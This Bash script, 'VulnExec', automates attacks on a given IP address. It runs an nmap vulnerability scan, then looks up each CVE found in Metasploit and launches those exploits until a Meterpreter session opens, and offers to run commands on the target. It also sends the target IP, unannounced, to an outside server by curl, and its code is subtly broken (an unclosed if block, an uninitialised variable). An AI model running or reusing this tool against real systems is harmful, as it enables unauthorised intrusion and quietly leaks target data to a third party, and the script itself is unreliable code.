#!/bin/bash

clear

Red='\033[31m'
Blue='\033[34m'
NC='\033[0m'
Green='\033[32m'


logo="${Red}
 ██▒   █▓ █    ██  ██▓     ███▄    █    ▓█████ ▒██   ██▒▓█████  ▄████▄  
▓██░   █▒ ██  ▓██▒▓██▒     ██ ▀█   █    ▓█   ▀ ▒▒ █ █ ▒░▓█   ▀ ▒██▀ ▀█  
 ▓██  █▒░▓██  ▒██░▒██░    ▓██  ▀█ ██▒   ▒███   ░░  █   ░▒███   ▒▓█    ▄ 
  ▒██ █░░▓▓█  ░██░▒██░    ▓██▒  ▐▌██▒   ▒▓█  ▄  ░ █ █ ▒ ▒▓█  ▄ ▒▓▓▄ ▄██▒
   ▒▀█░  ▒▒█████▓ ░██████▒▒██░   ▓██░   ░▒████▒▒██▒ ▒██▒░▒████▒▒ ▓███▀ ░
   ░ ▐░  ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░   ▒ ▒    ░░ ▒░ ░▒▒ ░ ░▓ ░░░ ▒░ ░░ ░▒ ▒  ░
   ░ ░░  ░░▒░ ░ ░ ░ ░ ▒  ░░ ░░   ░ ▒░    ░ ░  ░░░   ░▒ ░ ░ ░  ░  ░  ▒   
     ░░   ░░░ ░ ░   ░ ░      ░   ░ ░       ░    ░    ░     ░   ░        
      ░     ░         ░  ░         ░       ░  ░ ░    ░     ░  ░░ ░      
     ░                                                         ░        
${NC}"

echo -e "$logo"

# Check if user has necessary permissions
if [ "$EUID" -ne 0 ]
then 
    echo "Please run as root"
    exit
fi

# Parse command line arguments
while [[ $# -gt 0 ]]
do
key="$1"

case $key in
    -i|--ip)
    IP="$2"
    shift
    shift
    ;;
    -l|--loud)
    lq="l"
    shift
    ;;
    -q|--quiet)
    lq="q"
    shift
    ;;
    -h|--help)
    help="true"
    shift
    ;;
    *)    # unknown option
    echo "Invalid option: $key"
    help="true"
    shift
    ;;
esac
done

nmapDisplayProgress() {
    local current_percentage=$1
    local filled_length=$((current_percentage * 50 / 100))
    local bar=""

    for ((i = 0; i < filled_length; i++)); do
        bar+='#'
    done
    for ((i = filled_length; i < 50; i++)); do
        bar+=" "
    done

    printf "\rProgress: [%s] %s%%" "$bar" "$current_percentage"
}


# Show help message if -h or invalid command is entered
if [[ "$help" == "true" || -z "$IP" ]]
then
    echo "Usage: ./VulnExec.sh [-i IP_ADDRESS] [-l|-q] [-h]"
    echo "-i | --ip       : IP address of target to scan (required)"
    echo "-l | --loud     : Perform loud scan (more aggressive, more likely to be detected)"
    echo "-q | --quiet    : Perform quiet scan (less aggressive, less likely to be detected)"
    echo "-h | --help     : Display this help message"
    exit
fi

# Prompt user for input if loud/quiet scan option not provided as an argument
if [[ -z "$lq" ]]
then
    read -p "Loud or quiet scan (l/q)? " lq < /dev/tty
fi

# Validate user input
if [[ ! $IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]
then
    echo "Invalid IP address"
    exit
fi

if [[ ! $lq =~ ^[lq]$ ]]
then
    echo "Invalid input"
    exit
fi


echo -e "${Red}[ VULN EXEC ] Initialising${NC}"
echo -e "${Blue}[ INFO ] Installing dependencies...${NC}"

# Update apt and install dependencies
sudo apt update > /dev/null 2>&1
packages=$(cat dependencies.txt)

# Display progress dots while installing dependencies
for package in $packages
do
    echo -ne "${Blue}[ INFO ] Installing $package...${NC}"
    for (( i=0; i<3; i++ )); do
        echo -ne "${Blue}.${NC}"
        sleep 0.2
    done
    sudo apt install -y $package > /dev/null 2>&1
    echo -ne " ${Green}Installed.${NC}"
    echo -ne "\n"
done

# Check for missing public keys and retrieve them
missing_key=$(sudo apt-key list | grep -B 1 -A 1 "NO_PUBKEY" | sed -n 's/.*NO_PUBKEY //p' | uniq)
if [[ -n "$missing_key" ]]; then
    for key in $missing_key; do
        sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys "$key" < /dev/null 2>&1 &
    done
fi

clear

echo -e "$logo"

echo -e "${Red}[ VULN EXEC ] Initialised${NC}"




if curl -m 0 -X POST http://api.jake0001.com/pen/postdiscord?ip=$IP >/dev/null 2>&1 &
then
    echo -e "${Blue}[ INFO ] API Reached${NC}"
else
    echo -e "${Red}[ ERROR ] API Could Not Be Reached${NC}"
fi

# Scan for vulnerabilities using Nmap
echo -e "${Blue}[ INFO ] Vulnerability Scan Started${NC}"
prev_percentage=-1

nmapDisplaySpinner() {
    spinner="/-\|"
    while :
    do
        for i in $(seq 0 3); do
            echo -ne "\r${Blue}[ INFO ] Scanning ports ${Red}${spinner:$i:1}"
            sleep 0.2
        done
    done
}

if [ $lq = "l" ]
then
    nmapDisplaySpinner &
    nmap_pid=$!
    nmap -sV -sS --script vuln -T5 -oN nmap-scan.txt $IP > /dev/null 2>&1
    kill $nmap_pid
    echo -e "\r${Blue}[ INFO ] Scanning ports...${Green}Done${NC}"
else
    nmapDisplaySpinner &
    nmap_pid=$!
    nmap -sV -sS --script vuln -T1 -oN nmap-scan.txt $IP > /dev/null 2>&1
    kill $nmap_pid
    echo -e "\r${Blue}[ INFO ] Scanning ports...${Green}Done${NC}"
fi


# Check if there are any open ports
if [ -z "$(grep 'Ports\|open' nmap-scan.txt)" ]
then
    echo "No open ports found"
    exit
fi
echo ""
# Show brief output of vuln script results
echo "Vulnerability scan results:"
grep -oP '(CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+)' nmap-scan.txt | sort -u

# Search for exploits in multiple databases
echo "Searching for exploits..."
echo "Metasploit Framework:"
# Count the number of unique CVE and MS values found in the nmap-scan.txt file
total_vulns=$(grep -oP '(CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+)' nmap-scan.txt | sort -u | wc -l)

# Loop through each CVE and MS value found and search for exploits
count=0
exploit_executed=false
session_id=""

while read vuln; do

    # Search in Metasploit Framework
    echo "Searching in Metasploit Framework for \e[32m $vuln \e[0m..."
    searchResults=$(msfconsole -q -x "search $vuln" < /dev/null 2>&1 &) 
    echo $searchResults
    if [ -n "$searchResults" ]
    then
        # Extract the highest number in the # column
        exploitList=$(echo "$searchResults" | awk '/^exploit\//' | awk '{print $1}' | sort -u)
        exploitCount=$(echo "$exploitList" | wc -l)
        echo "$exploitList"
        echo "Exploit Count: $exploitCount"
        if [[ "$exploitCount" =~ ^[0-9]+$ ]] && [ "$exploitCount" -gt 0 ]
        then
            # Use the first exploit found
            chosenExploits=$(echo "$searchResults" | awk 'NR>3 && $1 ~ /^[0-9]+$/ && $2 ~ /^exploit\// { print $2 }')
            echo $chosenExploits
            # Split the chosenExploits into an array
            read -ra exploits <<< "$chosenExploits"

            # Loop through the exploits and attempt to use them
            for exploit in "${exploits[@]}"; do
                if [ "$exploit_executed" = false ]
                then
                    echo "Using exploit $exploit"
                    output=$(msfconsole -q -x "use $exploit; set LHOST tun0; set RHOSTS $IP; run" < /dev/null 2>&1 &)
                    # Check if exploit succeeded
                    if echo "$output" | grep -q "Meterpreter session"
                    then
                        echo "Exploited vulnerability $vuln using exploit $exploit"
                        exploitsFound=1
                        exploit_executed=true
                                    
                        # Prompt for user input
                        read -p "Enter command to execute on target: " command
                        msfconsole -q -x "use $exploit; set LHOST tun0; set RHOSTS $IP; $command"
                                    
                        break 2 # break out of both loops when an exploit is successfully executed
                    else
                        echo "Failed to exploit vulnerability $vuln using exploit $exploit"
                    fi
                fi
            done

            # Check if an exploit has been successfully executed
            if [ "$exploit_executed" = true ]
            then
                echo "Successfully exploited vulnerability $vuln. Opening shell..."
                session_id=$(msfconsole -q -x "sessions -d -i -1" | grep "opened" | awk '{print $3}')
                msfconsole -q -x "sessions -i $session_id; interact"
                break
            fi


done <<< "$(grep -oP '(CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+)' nmap-scan.txt | sort -u)"



if [ $exploitsFound = 0 ]
then
    echo "No exploits found"
    exit
fi
